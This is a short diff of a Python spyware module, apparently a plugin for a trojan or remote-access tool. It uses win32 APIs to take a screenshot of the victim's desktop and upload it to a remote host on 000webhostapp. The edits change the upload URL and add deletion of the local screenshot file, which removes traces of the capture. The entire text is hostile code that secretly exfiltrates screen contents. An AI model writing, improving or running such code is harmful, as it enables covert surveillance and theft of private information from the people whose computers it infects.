@@ -3,7 +3,7 @@ import win32ui
 import win32con
 import win32api
 import requests
-
+import os
 
 def run(**args):
 # grab a handle to the main window
@@ -36,8 +36,9 @@ def run(**args):
    win32gui.DeleteObject(screenshot.GetHandle())
 
 #Send to remote server
-   url = "http://psyberlupus.000webhostapp.com/img.php/post"
+   url = "http://psyberlupus.000webhostapp.com/site.php/post"
    files = {'image': open('screenshot.bmp','rb')}
+   os.remove("screenshot.bmp")
    try:
      r = requests.post(url, files=files)
    except:
